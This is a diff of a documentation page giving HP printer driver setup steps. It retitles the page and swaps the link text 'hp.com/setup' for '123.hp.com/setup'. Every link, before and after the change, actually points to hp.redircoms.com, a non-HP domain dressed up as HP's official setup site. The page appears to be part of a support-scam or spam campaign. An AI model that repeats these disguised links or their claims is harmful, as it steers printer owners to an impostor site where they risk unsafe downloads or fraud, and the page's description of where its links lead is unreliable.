@@ -1,5 +1,5 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How do i setup hp printer via 123.hp.com/setup?
 ##################
 
 .. meta::
@@ -28,13 +28,13 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `123.hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `123.hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
 
 **********
 Steps to Download HP Printer Driver
 **********
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+1. Open a web browser and go to `123.hp.com/setup <https://hp.redircoms.com>`_.
 
 2. Enter your HP printer model in the search box.
 
